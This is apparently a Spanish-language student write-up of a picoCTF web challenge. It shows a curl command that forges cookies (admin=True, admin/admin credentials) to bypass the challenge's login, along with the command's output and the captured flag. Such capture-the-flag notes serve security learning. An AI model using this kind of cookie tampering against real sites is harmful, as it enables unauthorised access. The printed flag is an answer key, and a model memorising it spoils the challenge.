## Descripción
The factory is hiding things from all of its users. Can you login as Joe and find what they've been looking at? `https://jupiter.challenges.picoctf.org/problem/13594/` ([link](https://jupiter.challenges.picoctf.org/problem/13594/)) or http://jupiter.challenges.picoctf.org:13594
## Solución
accedemos a la red luego con el inspector revisamos lo que hace el navegador y observamos las peticiones. debemos ser administrador para poder acceder y ver la bandera con este comando accedemos como admin en la pagina.
```
curl -s -X GET https://jupiter.challenges.picoctf.org/problem/15796/flag -H "Cookie: username=admin; password=admin; admin=True" | grep pico
```

```
el-diego@Maquina-de-Guerra:~/Documentos/seguridad en redes$ curl -s -X GET https://jupiter.challenges.picoctf.org/problem/15796/flag -H "Cookie: username=admin; password=admin; admin=True" | grep pico
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{th3_c0nsp1r4cy_l1v3s_6edb3f5f}</code></p>

```

picoCTF{th3_c0nsp1r4cy_l1v3s_6edb3f5f}

## Referencias
curl --> es una herramienta de línea de comandos que permite transferir datos hacia y desde servidores utilizando diversos protocolos como HTTP, HTTPS, FTP y más
https --> [¿Qué es el protocolo HTTPS y para qué sirve? Guía completa](https://www.siteground.es/blog/que-es-https-y-para-que-sirve-guia-completa/)
grep --> buscador por medio de filtrado de una palabra